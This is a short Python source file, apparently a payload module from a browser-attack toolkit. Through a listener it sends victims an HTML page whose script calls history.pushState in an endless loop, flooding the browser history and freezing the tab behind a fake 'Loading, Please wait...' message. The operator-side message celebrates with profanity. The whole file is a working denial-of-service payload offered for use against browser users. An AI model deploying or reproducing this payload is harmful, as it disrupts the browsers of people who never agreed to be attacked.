class Payload (object):
    def __init__(self, listener):
        self.listener = listener

    def run (self):

        from core.design.colors import YES

        DATA = '''
        <h1>Loading, Please wait...</h1>
        <script>
            while (true) {
                history.pushState ({ foo: "bar" }, "FUCK YOU!", "http://localhost");
            }
        </script>
        '''

        self.listener.send_data (DATA)
        print YES + 'History Fucked ;)'
